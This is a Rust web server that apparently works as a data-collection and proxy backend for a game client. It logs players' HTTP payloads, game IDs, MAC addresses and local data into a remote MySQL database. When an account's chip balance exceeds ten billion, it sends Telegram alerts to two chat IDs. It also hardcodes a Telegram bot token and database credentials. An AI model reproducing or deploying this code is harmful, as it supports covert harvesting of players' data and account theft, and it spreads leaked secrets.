use std::collections::HashMap;

use actix_web::{
    get, post, web, App, HttpRequest, HttpResponse, HttpServer
};
use chrono::{DateTime, Utc};
use regex::Regex;
use reqwest::{header::CONTENT_TYPE, Client, Error, Response};
use serde::{Deserialize, Serialize};
use sqlx::{mysql::MySqlPoolOptions, FromRow, MySqlPool};

const ERROR_MESSAGE : &str ="64000000506172616D657465722073616C61682E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
const THOUSAND: u64 = 1000;
const MILLION: u64 = 1000000;
const BILLION: u64 = 1000000000;
const TRILLION: u64 = 1000000000000;

#[derive(Debug, Serialize, Deserialize, FromRow)]
struct UserClient {
    id: i32,
    id_client: String,
    owner: String,
    #[serde(rename="createdAt")]
    #[sqlx(rename="createdAt")]
    created_at: DateTime<Utc>,
}

#[derive(Debug,Serialize,Deserialize,FromRow)]
struct UserHttp {
    id: i32,
    client_id: String,
    data: String,
    #[serde(rename="createdAt")]
    #[sqlx(rename="createdAt")]
    created_at: DateTime<Utc>,
}

#[derive(Debug,Serialize,Deserialize,FromRow)]
struct UserIdGame {
    id: i32,
    client_id: String,
    data: String,
    #[serde(rename="createdAt")]
    #[sqlx(rename="createdAt")]
    created_at: DateTime<Utc>,
}

#[derive(Debug,Serialize,Deserialize,FromRow)]
struct UserLocalData {
    id: i32,
    client_id: String,
    data: String,
    #[serde(rename="createdAt")]
    #[sqlx(rename="createdAt")]
    created_at: DateTime<Utc>,
}

#[derive(Debug,Serialize,Deserialize,FromRow)]
struct UserLog {
    id: i32,
    client_id: String,
    data: String,
    #[serde(rename="createdAt")]
    #[sqlx(rename="createdAt")]
    created_at: DateTime<Utc>,
}

#[derive(Debug,Serialize,Deserialize,FromRow)]
struct UserMac {
    id: i32,
    client_id: String,
    data: String,
    #[serde(rename="createdAt")]
    #[sqlx(rename="createdAt")]
    created_at: DateTime<Utc>,
}

fn format_number(number: u64) -> String {
    match number {
        x if x >= TRILLION => format!("{:.3} T", number as f64 / TRILLION as f64) ,
        x if x >= BILLION => format!("{:.3} B", number as f64 / BILLION as f64) ,
        x if x >= MILLION => format!("{:.1} M", number as f64 / MILLION as f64) ,
        x if x >= THOUSAND => format!("{:.1} K", number as f64 / THOUSAND as f64) ,
        _ => { format!("{}",&number) }
    }
}

fn bytes_to_u64_chip(bytes_data: Vec<u8>) -> u64 {
    String::from_utf8(bytes_data)
        .expect("Invalid UTF-8")
        .trim_matches(char::from(0))
        .to_string()
        .parse::<u64>()
        .expect("Failed to parse integer")
}

async fn send_telegram_notification(client: &Client,message : &HashMap<&str, String>) -> Result<Response,Error> {
    client.post("https://api.telegram.org/bot5927621234:AAG_OXCv43wBTeNP0jWrtUjOmE9SAVhwALY/sendMessage")
        .header(CONTENT_TYPE, "application/json")
        .json(message)
        .send()
        .await
}

async fn post_telegram_chip(data: String, client_id: &str, owner: &str) {
    let chip = bytes_to_u64_chip(hex::decode(&data[480..512]).expect("Failed to decode hex"));
    let chip_brankas = bytes_to_u64_chip(hex::decode(&data[2656..2688]).expect("Failed to decode hex"));

    let chips_total = &chip + &chip_brankas;

    if chips_total > BILLION * 10 {
        let client = Client::new();
        let mut message: HashMap<&str,String> = HashMap::new();

        message.insert("chat_id", "686636217".to_string());
        message.insert("text", format!(
            "Cuy Update,\n\nUser dari Client: {}\nChipsnya: {}\nChip Brankasnya: {}\nOwner: {}",
            client_id,
            format_number(chip),
            format_number(chip_brankas),
            owner
        ));

        match send_telegram_notification(&client,&message).await {
            Ok(_) => {
                println!("[SERVER] Success send notification via telegram bot");
            },
            Err(err ) => {
                println!("[ERROR] Got an error from send_telegram_notification to S with details : {}",err);
            }
        }
        // let _res_s = client
        //     .post("https://api.telegram.org/bot5927621234:AAG_OXCv43wBTeNP0jWrtUjOmE9SAVhwALY/sendMessage")
        //     .header(CONTENT_TYPE, "application/json")
        //     .json(&message)
        //     .send()
        //     .await;
        
        message.insert("chat_id", "7223207237".to_string());
        
        match send_telegram_notification(&client,&message).await {
            Ok(_) => {
                println!("[SERVER] Success send notification via telegram bot");
            },
            Err(err ) => {
                println!("[ERROR] Got an error from send_telegram_notification to A with details : {}",err);
            }
        }
        // let _res_a = client
        //     .post("https://api.telegram.org/bot5927621234:AAG_OXCv43wBTeNP0jWrtUjOmE9SAVhwALY/sendMessage")
        //     .header(CONTENT_TYPE, "application/json")
        //     .json(&message)
        //     .send()
        //     .await;
    }
}

async fn create_pool() -> MySqlPool {
    let database_url: String = String::from("mysql://leon:Dominskuy123!@202.70.133.108:3306/data");
    let pool = MySqlPoolOptions::new()
        .max_connections(10)
        .connect(&database_url)
        .await
        .unwrap();
    pool
}

#[get("/data/handleMsg.do")]
async fn proxy_handler(
    req: HttpRequest,
) -> HttpResponse {
    let req_query_v = req.query_string()
        .split('&')
        .find_map(|s| {
            let mut parts = s.split('=');
            match (parts.next() , parts.next()) {
                (Some("v"), Some(val)) => Some(val.to_string()),
                _ => None,
            }
        }).unwrap_or_default();

    if req_query_v.is_empty() {
        println!("Data invalid");
        return HttpResponse::Ok().body(ERROR_MESSAGE)
    }

    let client = Client::new();

    // println!("Data yang masuk = {}",&req_query_v);

    match client
        .get("https://i.m7aq.com/data/handleMsg.do")
        .query(&[("v",&req_query_v)])
        .send()
        .await
    {
        Ok(resp) => {
            let body = resp.text().await.unwrap_or_default();
            HttpResponse::Ok().body(body)
        }
        Err(e) => {
            println!("Error = {}",e);
            HttpResponse::Ok().body(ERROR_MESSAGE)
        }
    }
}

#[post("/Msg.do/{id}")]
async fn data_handler(
    pool: web::Data<MySqlPool>,
    path: web::Path<u8>,
    req: HttpRequest,
    body: String,
 ) -> HttpResponse {
    let id = path.into_inner();
    
    let client_id = req.query_string()
        .split('&')
        .find_map(|s| {
            let mut parts = s.split('=');
            match (parts.next(), parts.next()) {
                (Some("client"), Some(val)) => Some(val.to_string()),
                _ => None,
            }
        }).unwrap_or_default();

    if client_id.is_empty() {
        return  HttpResponse::BadRequest().body("BAD REQUEST");
    }

    let _user_client = sqlx::query(
        "INSERT INTO client (id_client, owner)
         VALUES (?, ?) 
         ON DUPLICATE KEY UPDATE
         owner = VALUES(owner)")
            .bind(&client_id)
            .bind("bersama")
            .execute(pool.as_ref()).await.unwrap();

    match id {
        1 => {
            println!("Ready for insert http");
            // insert http
            match body.len() {
                216 | 80 => {
                    let _result = sqlx::query(
                        "INSERT INTO http (data, client_id, createdAt) 
                        VALUES (?, ?, NOW())
                        ")
                        .bind(body)
                        .bind(&client_id)
                        .execute(pool.as_ref())
                        .await;
                },
                2744 | 2728 => {
                    post_telegram_chip(body.clone(), &client_id, "sdhz").await;
                    let _result = sqlx::query(
                        "INSERT INTO http (data, client_id, createdAt) 
                        VALUES (?, ?, NOW())
                        ")
                        .bind(body.clone())
                        .bind(&client_id)
                        .execute(pool.as_ref())
                        .await;
                },
                _ => {},
            }

            HttpResponse::Ok().finish()
        }
        2 => {
            // insert log
            let _result = sqlx::query(
                "INSERT INTO log (data, client_id, createdAt) 
                VALUES (?, ?, NOW())
                ")
                .bind(&body)
                .bind(&client_id)
                .execute(pool.as_ref())
                .await;

            let id_game_regex = Regex::new(r"^[0-9]{4,10}$").unwrap();
            if id_game_regex.is_match(&body.to_string()) {
                // insert id_game
                let _result_id_game = sqlx::query(
                    "INSERT INTO id_game (data, client_id, createdAt) 
                    VALUES (?, ?, NOW())
                    ON DUPLICATE KEY UPDATE
                    data = VALUES(data)
                    ")
                    .bind(&body)
                    .bind(&client_id)
                    .execute(pool.as_ref())
                    .await;
            }

            HttpResponse::Ok().finish()
        }
        3 => {
            // insert mac
            let _result = sqlx::query(
                "INSERT INTO mac (data, client_id, createdAt) 
                VALUES (?, ?, NOW()) 
                ON DUPLICATE KEY UPDATE
                data = VALUES(data)")
                    .bind(body)
                    .bind(&client_id)
                    .execute(pool.as_ref())
                    .await
                    .unwrap();

            HttpResponse::Ok().finish()
        }
        4 => {
            // insert localData
            let _result = sqlx::query(
                "INSERT INTO local_data (data, client_id, createdAt) 
                VALUES (?, ?, NOW())
                ")
                .bind(body)
                .bind(&client_id)
                .execute(pool.as_ref())
                .await;

            HttpResponse::Ok().body("data 4")
        }
        _ => HttpResponse::NotFound().finish(),
    }

}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let pool = create_pool().await;

    println!("[SERVER] : Server Running at Port 8080");
    HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .service(proxy_handler)
            .service(data_handler)
    })
    .bind(("0.0.0.0", 8080))?
    .run()
    .await
}
